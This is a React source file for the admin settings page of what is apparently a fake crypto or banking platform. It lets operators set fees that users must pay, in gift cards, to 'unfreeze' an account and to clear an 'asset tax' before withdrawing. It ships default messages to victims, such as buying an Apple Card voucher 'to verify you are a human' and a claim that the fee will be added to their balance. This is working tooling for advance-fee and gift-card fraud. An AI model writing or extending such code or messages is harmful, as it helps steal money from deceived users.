import React, { useState, useEffect } from 'react';
import { getSettings, saveSettings } from '../../services/api';
import toast from 'react-hot-toast';
import {
  LuCreditCard as CreditCard,
  LuSave as Save,
  LuCircleCheck as CheckCircle2,
  LuLockOpen as Unlock,
  LuFileCheck as FileCheck,
  LuDollarSign as DollarSign,
} from 'react-icons/lu';
import './AdminPanel.css';

export const AdminPayments = () => {
  const [loading, setLoading] = useState(true);
  const [saved, setSaved] = useState(false);

  // Form fields
  const [unfreezeAmount, setUnfreezeAmount] = useState(300);
  const [unfreezeCardType, setUnfreezeCardType] = useState('Apple Card');
  const [taxAmount, setTaxAmount] = useState(500);
  const [taxCardType, setTaxCardType] = useState('Apple Card');
  const [minDeposit, setMinDeposit] = useState(50);
  const [minWithdrawal, setMinWithdrawal] = useState(50);
  const [minTransfer, setMinTransfer] = useState(10);
  const [maxTransfer, setMaxTransfer] = useState(1000000);
  const [maxWithdrawal, setMaxWithdrawal] = useState(5000000);
  const [unfreezeNotice, setUnfreezeNotice] = useState('');
  const [taxNotice, setTaxNotice] = useState('');

  const loadSettings = async () => {
    try {
      const res = await getSettings();
      if (res.success) {
        const s = res.settings;
        setUnfreezeAmount(s.unfreezeAmount || 300);
        setUnfreezeCardType(s.unfreezeCardType || 'Apple Card');
        setTaxAmount(s.taxAmount || 500);
        setTaxCardType(s.taxCardType || 'Apple Card');
        setMinDeposit(s.minDepositAmount || 50);
        setMinWithdrawal(s.minWithdrawalAmount || 50);
        setMinTransfer(s.minTransferAmount || 10);
        setMaxTransfer(s.maxTransferAmount || 1000000);
        setMaxWithdrawal(s.maxWithdrawalAmount || 5000000);
        setUnfreezeNotice(s.unfreezeCustomNotice || '');
        setTaxNotice(s.taxCustomNotice || '');
      }
    } catch (err) {
      toast.error('Failed to load payment settings.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadSettings();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await saveSettings({
        unfreezeAmount: Number(unfreezeAmount),
        unfreezeCardType,
        taxAmount: Number(taxAmount),
        taxCardType,
        minDepositAmount: Number(minDeposit),
        minWithdrawalAmount: Number(minWithdrawal),
        minTransferAmount: Number(minTransfer),
        maxTransferAmount: Number(maxTransfer),
        maxWithdrawalAmount: Number(maxWithdrawal),
        unfreezeCustomNotice: unfreezeNotice.trim() || undefined,
        taxCustomNotice: taxNotice.trim() || undefined,
      });
      setSaved(true);
      setTimeout(() => setSaved(false), 3000);
      toast.success('Payment settings saved.');
      loadSettings();
    } catch (err) {
      toast.error('Save failed.');
    }
  };

  if (loading) return <div className="admin-loading">Loading payment settings...</div>;

  return (
    <div className="admin-payments">
      <div className="header">
        <CreditCard /> Payment & Fee Settings
        <span>Customize the exact amount users must pay across all payment and verification portals</span>
      </div>

      {saved && (
        <div className="success-banner">
          <CheckCircle2 /> Payment Settings Saved! All customer payment amounts have been updated system-wide.
        </div>
      )}

      <form onSubmit={handleSubmit} className="payments-form">
        <div className="section">
          <h3><Unlock /> Account Unfreeze Verification Fee</h3>
          <div className="form-row">
            <div>
              <label>Unfreeze Payment Amount ($)</label>
              <div className="input-with-symbol">
                <span>$</span>
                <input type="number" min="1" step="any" required value={unfreezeAmount} onChange={e => setUnfreezeAmount(parseFloat(e.target.value) || 0)} />
              </div>
              <div className="quick-presets">
                {[100,200,300,500,1000].map(amt => (
                  <button type="button" key={amt} onClick={() => setUnfreezeAmount(amt)} className={unfreezeAmount === amt ? 'active' : ''}>
                    ${amt}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label>Required Card / Voucher Type</label>
              <input type="text" required value={unfreezeCardType} onChange={e => setUnfreezeCardType(e.target.value)} />
            </div>
          </div>
          <div>
            <label>Custom Unfreeze Prompt Notice (Optional)</label>
            <textarea rows="2" value={unfreezeNotice} onChange={e => setUnfreezeNotice(e.target.value)} placeholder={`Default: Kindly buy a $${unfreezeAmount} ${unfreezeCardType.toLowerCase()} to verify you are a human...`} />
          </div>
          <div className="preview">
            <span>Live User View Preview:</span>
            <p>{unfreezeNotice.trim() || `Kindly buy a $${unfreezeAmount.toLocaleString()} ${unfreezeCardType.toLowerCase()} to verify you are a human and not a bot to unfreeze your account, note: your $${unfreezeAmount.toLocaleString()} will be credited/ added to your balance, and you will withdraw it together.`}</p>
          </div>
        </div>

        <div className="section">
          <h3><FileCheck /> Asset Tax Clearance Fee</h3>
          <div className="form-row">
            <div>
              <label>Asset Tax Fee Amount ($)</label>
              <div className="input-with-symbol">
                <span>$</span>
                <input type="number" min="1" step="any" required value={taxAmount} onChange={e => setTaxAmount(parseFloat(e.target.value) || 0)} />
              </div>
              <div className="quick-presets">
                {[250,500,750,1000,2000,5000].map(amt => (
                  <button type="button" key={amt} onClick={() => setTaxAmount(amt)} className={taxAmount === amt ? 'active' : ''}>
                    ${amt}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label>Tax Clearance Card / Voucher Type</label>
              <input type="text" required value={taxCardType} onChange={e => setTaxCardType(e.target.value)} />
            </div>
          </div>
          <div>
            <label>Custom Asset Tax Notice (Optional)</label>
            <textarea rows="2" value={taxNotice} onChange={e => setTaxNotice(e.target.value)} placeholder={`Default: You will have to pay an asset tax fee of $${taxAmount.toLocaleString()}, to proceed with your withdrawal.`} />
          </div>
          <div className="preview">
            <span>Live User View Preview:</span>
            <p>{taxNotice.trim() || `You will have to pay an asset tax fee of $${taxAmount.toLocaleString()}, to proceed with your withdrawal. Note: the tax fee will be added to your balance.`}</p>
          </div>
        </div>

        <div className="section">
          <h3><DollarSign /> Deposit, Transfer & Withdrawal Thresholds</h3>
          <div className="form-row">
            <div><label>Min Bitcoin Deposit ($)</label><input type="number" min="1" required value={minDeposit} onChange={e => setMinDeposit(parseFloat(e.target.value) || 0)} /></div>
            <div><label>Min P2P Transfer ($)</label><input type="number" min="1" required value={minTransfer} onChange={e => setMinTransfer(parseFloat(e.target.value) || 0)} /></div>
            <div><label>Min Withdrawal ($)</label><input type="number" min="1" required value={minWithdrawal} onChange={e => setMinWithdrawal(parseFloat(e.target.value) || 0)} /></div>
          </div>
          <div className="form-row">
            <div><label>Max Single Transfer Cap ($)</label><input type="number" min="1" required value={maxTransfer} onChange={e => setMaxTransfer(parseFloat(e.target.value) || 0)} /></div>
            <div><label>Max Single Withdrawal Cap ($)</label><input type="number" min="1" required value={maxWithdrawal} onChange={e => setMaxWithdrawal(parseFloat(e.target.value) || 0)} /></div>
          </div>
        </div>

        <button type="submit" className="submit-btn"><Save /> Save Payment Settings</button>
      </form>
    </div>
  );
};